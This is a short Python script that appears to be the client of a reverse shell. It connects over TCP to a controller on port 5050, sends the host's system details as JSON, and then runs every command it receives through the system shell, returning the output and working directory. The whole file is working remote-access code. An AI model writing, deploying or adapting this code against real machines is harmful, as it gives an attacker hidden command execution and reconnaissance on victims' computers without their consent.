import os
import socket
import subprocess
import psutil
import platform
import json

PORT = 5050
# HOST = '192.168.43.33'
HOST = socket.gethostbyname(socket.gethostname())
ADDR = (HOST, PORT)
FORMAT = 'utf-8'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def sys_info():

    uname = platform.uname()

    sys_info = {
        'System': uname.system,
        'Node Name': uname.node,
        'Release': uname.release,
        'Version': uname.version,
        'Machine': uname.machine,
        'Processor': uname.processor
    }

    sysData = json.dumps(sys_info).encode(FORMAT)
    client.send(sysData)

sys_info()

while True:
    data = client.recv(1024)
    if data[:2].decode(FORMAT) == "cd":
        os.chdir(data[3:].decode(FORMAT))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output = str(output, FORMAT)
        client.send(str.encode(output + str(os.getcwd()) + "$ "))
        print(output)


client.close()